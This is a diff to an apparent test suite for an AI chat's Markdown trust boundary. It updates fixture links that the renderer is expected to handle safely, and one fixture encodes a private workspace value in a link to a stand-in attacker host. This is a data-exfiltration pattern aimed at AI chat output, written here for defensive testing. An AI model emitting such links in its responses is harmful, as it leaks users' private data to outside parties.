@@ -73,7 +73,7 @@ describe('ai chat Markdown trust boundary', () => {
       '[encoded learner code](https://attacker.invalid/?code=private-workspace-value)',
       '[local tour](/tour)',
       '[local query exfiltration](/tour?code=private-workspace-value)',
-      '[internal endpoint](/api/ai-key?code=private-workspace-value)',
+      '[internal endpoint](/api/ai-gateway/metadata?code=private-workspace-value)',
     ].join('\n\n'))
 
     await waitFor(() => {
